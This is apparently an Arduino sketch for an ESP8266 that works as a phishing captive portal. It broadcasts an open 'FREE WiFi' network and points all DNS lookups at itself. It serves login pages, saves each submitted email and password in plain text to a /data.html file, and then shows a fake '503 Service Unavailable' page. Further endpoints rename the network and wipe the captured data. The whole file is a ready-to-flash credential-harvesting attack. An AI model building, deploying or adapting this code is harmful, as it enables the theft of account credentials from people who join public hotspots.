/* 
 *  by Kriscius
 *  http://kriscius.pl/
 */
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <ESP8266WebServer.h>
#include "FS.h"

ESP8266WebServer server(80);

const byte DNS_PORT = 53;
DNSServer dnsServer;

IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

char ssid[] = "FREE WiFi";

String data;

bool handleFile(String path) {
  if(path.endsWith("/")) path += "index";
  if(SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    server.streamFile(file, "text/html");
    file.close();

    return true;
  }

  return false;
}

void resetData() {
  File readData = SPIFFS.open("/data.html", "w");
  readData.close();
}

void changeSSID() {
  String ssidName = server.arg("ssid");
  const char* ssid = ssidName.c_str();
  WiFi.softAP(ssid);
}

void getData() {
  String email = server.arg("email");
  String pass  = server.arg("pass");
  
  if(email.length() && pass.length() != 0) {
    data = "Email: ";
    data += email;
    data += "<br>Password: ";
    data += pass;
    data += "<br><br>";
    
    File loginData = SPIFFS.open("/data.html", "a");
    if(loginData) {
      loginData.println(data);
      loginData.close();

      server.sendHeader("Location", "/error");
      server.send(301);
    } else  { 
      server.sendHeader("Location", "/");
      server.send(301);
    }
  } else {
      server.sendHeader("Location", "/");
      server.send(301);
  }
}

void setup() {
  SPIFFS.begin();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);

  dnsServer.setTTL(1000);
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  if(MDNS.begin("captive.portal")) {
    MDNS.addService("http", "tcp", 80);
  }
  
  server.onNotFound([]() {
    if (!handleFile(server.uri()))
      handleFile("/");
  });

  server.on("/login_redirect", getData);
  server.on("/reset", resetData);
  server.on("/ssid", changeSSID);
  server.on("/error", []() { 
    server.sendHeader("Connection", "close");
    server.sendHeader("Access-Control-Allow-Origin", "*");
    server.send(503, "text/plain", "503 Service Unavailable");
  });
  
  server.begin();
}
 
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
